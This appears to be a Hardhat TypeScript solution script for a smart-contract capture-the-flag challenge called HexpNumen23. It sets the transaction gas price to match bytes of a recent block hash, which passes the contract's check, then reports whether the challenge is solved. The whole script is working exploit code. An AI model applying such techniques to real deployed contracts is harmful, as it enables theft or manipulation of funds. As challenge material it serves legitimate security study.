import chalk from "chalk";
import { ethers } from "hardhat";
import { HexpNumen23__factory, HexpNumen23 } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [hexpNumen23Contract, attacker] = await initialize<HexpNumen23>(HexpNumen23__factory); 

    let code = "0x62ffffff80600a43034016903a1681146016576033fe5b5060006000f3";
    // block.blockHash(block.number - 0x0a) & 0xffffff == gasprice & 0xffffff
    let block = await ethers.provider.getBlock((await ethers.provider.getBlockNumber())-9);  // 10 maybe late
    let hash = block?.hash;
    let tx = await hexpNumen23Contract.f00000000_bvvvdlt({gasPrice:"0x1234"+hash?.slice(60, 66)});
    await tx.wait();
    
    log(`Is solved: ${chalk.yellow(await hexpNumen23Contract.isSolved())}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});